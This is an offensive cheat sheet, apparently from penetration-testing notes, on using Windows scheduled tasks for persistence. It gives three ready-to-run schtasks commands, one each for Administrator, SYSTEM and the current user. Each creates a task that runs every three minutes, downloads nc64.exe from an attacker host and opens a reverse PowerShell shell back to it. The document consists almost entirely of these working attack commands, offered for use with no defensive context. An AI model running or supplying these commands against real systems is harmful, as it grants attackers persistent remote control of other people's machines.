## Tool: Scheduled Tasks (Windows)

To create a scheduled task that runs every 3 minutes, as Administrator, downloads nc64.exe and sends a reverse shell (PowerShell x64) from the target machine

```powershell
schtasks /create /ru "Administrator" /rp "password" /tn "Payback1" /sc minute /mo 3 /tr "powershell.exe -c wget http://192.168.14.10/nc64.exe -o C:\users\Public\nc64.exe;C:\Users\Public\nc64.exe 192.168.14.10 8080 -e C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
```

To create a scheduled task that runs every 3 minutes, as NT Authority/SYSTEM, downloads nc64.exe and sends a reverse shell (PowerShell x64) from the target machine

```powershell
schtasks /create /ru "NT Authority\SYSTEM" /tn "Payback1" /sc minute /mo 3 /tr "powershell.exe -c wget http://192.168.14.10/nc64.exe -o C:\users\Public\nc64.exe;C:\Users\Public\nc64.exe 192.168.14.10 8080 -e C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
```

To create a scheduled task that runs every 3 minutes, as current user, downloads nc64.exe and sends a reverse shell (PowerShell x64) from the target machine

```powershell
schtasks /create /tn "Payback1" /sc minute /mo 3 /tr "powershell.exe -c wget http://192.168.14.10/nc64.exe -o C:\users\Public\nc64.exe;C:\Users\Public\nc64.exe 192.168.14.10 8080 -e C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
```
